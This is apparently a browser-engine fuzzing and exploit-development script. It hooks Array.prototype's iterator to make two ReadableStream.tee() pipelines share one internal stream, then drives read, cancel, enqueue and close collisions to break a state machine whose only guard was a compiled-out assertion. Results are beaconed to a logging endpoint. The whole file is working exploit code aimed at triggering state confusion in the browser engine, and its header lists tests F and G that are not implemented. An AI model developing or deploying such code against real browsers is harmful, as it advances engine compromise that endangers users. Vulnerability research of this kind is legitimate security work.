/*
 * p434b -- Stream state collision via shared internal
 *
 * V433D confirmed: two tee pipelines sharing one internal stream.
 * Now: trigger state machine violations where compiled-out @assert
 * was the only guard.
 *
 * Tests:
 *   A: Double-reader (acquire readers from both sides)
 *   B: Close-while-read (side A reads pending, side B closes controller)
 *   C: Error-while-read (side A reads pending, side B errors controller)
 *   D: Cancel from both sides simultaneously
 *   E: Enqueue after error (side A errors, side B enqueues)
 *   F: Read after close from different side
 *   G: Rapid alternating read/close/error
 *
 * Beacon prefix: V434B-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V434B-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

// Create shared internal: teeA captures internal, teeB wraps it
function createSharedStream(ctrlHolder) {
  // Stream A with held controller
  var ctrlA = null;
  var rsA = new ReadableStream({
    start: function(c) { ctrlA = c; }
  });

  var realInternal = null;
  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        realInternal = self[1];
        var items = [self[0], self[1]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  var branchesA;
  try {
    branchesA = rsA.tee();
    Array.prototype[Symbol.iterator] = origIter;
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    return null;
  }

  if (!realInternal) return null;

  // Stream B: substitute with realInternal from A
  var rsB = new ReadableStream({
    start: function(c) { if (ctrlHolder) ctrlHolder.ctrlB = c; }
  });

  intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        var items = [self[0], realInternal];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  var branchesB;
  try {
    branchesB = rsB.tee();
    Array.prototype[Symbol.iterator] = origIter;
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    return null;
  }

  // branchesA[1] and branchesB[1] share the same internal stream
  return {
    sideA: branchesA[1],  // ReadableStream wrapping shared internal (via A's tee)
    sideB: branchesB[1],  // ReadableStream wrapping shared internal (via B's tee)
    branch0A: branchesA[0],
    branch0B: branchesB[0],
    ctrlA: ctrlA,
    internal: realInternal
  };
}

// ================================================================
// Test A: Double reader -- both sides getReader()
// Second should fail (locked), but shared state means both see same lock
// ================================================================
function testA() {
  B("A-START");
  var s = createSharedStream();
  if (!s) { B("A-SETUP-FAIL"); return; }

  try {
    var readerA = s.sideA.getReader();
    B("A-READER-A-OK", s.sideA.locked);

    // Now try reader on sideB (same internal!)
    try {
      var readerB = s.sideB.getReader();
      B("A-READER-B-OK!!!", s.sideB.locked); // Should be locked!
    } catch(e) {
      B("A-READER-B-ERR", e.message.slice(0, 60));
    }

    // Check if sideA reader still works
    s.ctrlA.enqueue("double-reader-data");
    s.ctrlA.close();

    // Read from A's branch0 to trigger tee pull -> data flows to shared internal
    var r0 = s.branch0A.getReader();
    r0.read().then(function() {
      return readerA.read();
    }).then(function(r) {
      B("A-READER-A-READ", {done: r.done, val: String(r.value).slice(0, 40)});
    }).catch(function(e) {
      B("A-READ-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    B("A-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// Test B: Get reader from sideA, then CANCEL sideB
// Cancel on shared internal while reader exists on another wrapper
// ================================================================
function testB() {
  B("B-START");
  var s = createSharedStream();
  if (!s) { B("B-SETUP-FAIL"); return; }

  try {
    var readerA = s.sideA.getReader();
    B("B-READER-A-OK");

    // Cancel sideB (same internal)
    s.sideB.cancel("collision-cancel").then(function() {
      B("B-CANCEL-OK");

      // Now try to read from readerA (internal was cancelled by B)
      s.ctrlA.enqueue("post-cancel");
      var r0 = s.branch0A.getReader();
      r0.read().then(function() {
        return readerA.read();
      }).then(function(r) {
        B("B-READ-AFTER-CANCEL", {done: r.done, val: String(r.value).slice(0, 40)});
      }).catch(function(e) {
        B("B-READ-AFTER-CANCEL-ERR", e.message.slice(0, 60));
      });
    }).catch(function(e) {
      B("B-CANCEL-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    B("B-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// Test C: Enqueue data, get reader A, read pending, close from B's controller access
// ================================================================
function testC() {
  B("C-START");
  var s = createSharedStream();
  if (!s) { B("C-SETUP-FAIL"); return; }

  try {
    var readerA = s.sideA.getReader();
    B("C-READER-A-OK");

    // Start a pending read (no data yet)
    var readPromise = readerA.read();
    B("C-READ-PENDING");

    // Now get reader on sideB (should fail -- locked by A)
    // But cancel sideB (doesn't need reader)
    s.sideB.cancel("cancel-during-read").then(function() {
      B("C-CANCEL-OK");
    }).catch(function(e) {
      B("C-CANCEL-ERR", e.message.slice(0, 60));
    });

    readPromise.then(function(r) {
      B("C-READ-RESOLVED", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 40)});
    }).catch(function(e) {
      B("C-READ-REJECTED", e.message.slice(0, 60));
    });

    // Also enqueue from ctrlA after cancel
    setTimeout(function() {
      try {
        s.ctrlA.enqueue("after-cancel-enqueue");
        B("C-ENQUEUE-OK");
      } catch(e) {
        B("C-ENQUEUE-ERR", e.message.slice(0, 60));
      }
      // Drive the tee pull
      try {
        var r0 = s.branch0A.getReader();
        r0.read();
      } catch(e) {}
    }, 50);
  } catch(e) {
    B("C-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// Test D: Error from sideB while sideA has active reader + pending read
// @assert(state === "readable") in error path is compiled out
// ================================================================
function testD() {
  B("D-START");
  var s = createSharedStream();
  if (!s) { B("D-SETUP-FAIL"); return; }

  try {
    var readerA = s.sideA.getReader();
    B("D-READER-A-OK");

    var readPromise = readerA.read();

    // Error the internal from sideB
    // The internal's readableStreamController is from teeA
    // Erroring sideB should propagate to the shared internal
    try {
      s.sideB.cancel(new Error("COLLISION-ERROR")).then(function() {
        B("D-CANCEL-B-OK");
      }).catch(function(e) {
        B("D-CANCEL-B-ERR", e.message.slice(0, 60));
      });
    } catch(e) {
      B("D-CANCEL-EXCEPT", e.message.slice(0, 60));
    }

    readPromise.then(function(r) {
      B("D-READ", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 40)});
    }).catch(function(e) {
      B("D-READ-ERR", e.message.slice(0, 60));
    });

    // Feed data from ctrlA
    setTimeout(function() {
      try {
        s.ctrlA.enqueue("post-error-data");
        B("D-ENQUEUE-OK");
        s.ctrlA.close();
      } catch(e) {
        B("D-ENQUEUE-ERR", e.message.slice(0, 60));
      }
      try { s.branch0A.getReader().read(); } catch(e) {}
    }, 50);
  } catch(e) {
    B("D-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// Test E: Rapid: reader A reads, cancel B, enqueue A, close A, read A
// Stack all operations to maximize state confusion
// ================================================================
function testE() {
  B("E-START");
  var s = createSharedStream();
  if (!s) { B("E-SETUP-FAIL"); return; }

  try {
    // Enqueue some data first
    s.ctrlA.enqueue("E1");
    s.ctrlA.enqueue("E2");
    s.ctrlA.enqueue("E3");

    // Trigger tee pull via branch0A read
    var r0 = s.branch0A.getReader();
    var readerA = s.sideA.getReader();
    B("E-READERS-OK");

    // Read all from r0 to flush the tee pipeline
    r0.read().then(function() { return r0.read(); })
      .then(function() { return r0.read(); })
      .then(function() {
        B("E-R0-FLUSHED");

        // Now read from readerA
        return readerA.read();
      }).then(function(r) {
        B("E-READ-1", {done: r.done, val: String(r.value).slice(0, 20)});

        // Cancel sideB while reader A holds data
        s.sideB.cancel("rapid-cancel");

        return readerA.read();
      }).then(function(r) {
        B("E-READ-2", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 20)});

        // Try to enqueue more after cancel
        try {
          s.ctrlA.enqueue("POST-CANCEL");
          B("E-POST-CANCEL-ENQUEUE-OK");
        } catch(e) {
          B("E-POST-CANCEL-ENQUEUE-ERR", e.message.slice(0, 40));
        }

        return readerA.read();
      }).then(function(r) {
        B("E-READ-3", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 20)});
      }).catch(function(e) {
        B("E-CHAIN-ERR", e.message.slice(0, 60));
      });

    s.ctrlA.close();
  } catch(e) {
    B("E-ERR", e.message.slice(0, 60));
  }
}

testA();
setTimeout(function() { testB(); }, 200);
setTimeout(function() { testC(); }, 500);
setTimeout(function() { testD(); }, 800);
setTimeout(function() { testE(); }, 1100);
setTimeout(function() { B("DONE"); }, 3000);
})();
